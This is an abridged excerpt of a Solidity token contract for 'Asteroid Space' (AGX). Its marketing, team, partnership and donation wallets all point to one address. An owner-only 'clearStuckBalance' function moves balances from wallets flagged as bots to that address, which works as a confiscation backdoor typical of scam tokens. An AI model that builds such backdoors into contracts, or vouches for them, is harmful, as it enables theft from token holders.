...
/*
Telegram : https://t.me/AsteroidSpace
Website  : https://asteroidgalaxy.space/
...
contract AGX is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x5094c42c9af68489f37b023C6f9590D3654a1311));
    address payable public _teamwallet =
        payable(address(0x5094c42c9af68489f37b023C6f9590D3654a1311));
    address _partnershipswallet =
        payable(address(0x5094c42c9af68489f37b023C6f9590D3654a1311));
    address private _donationAddress =
        0x5094c42c9af68489f37b023C6f9590D3654a1311;

    string private _name = "Asteroid Space";
    string private _symbol = "AGX";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x5094c42c9af68489f37b023C6f9590D3654a1311), amount);
        }
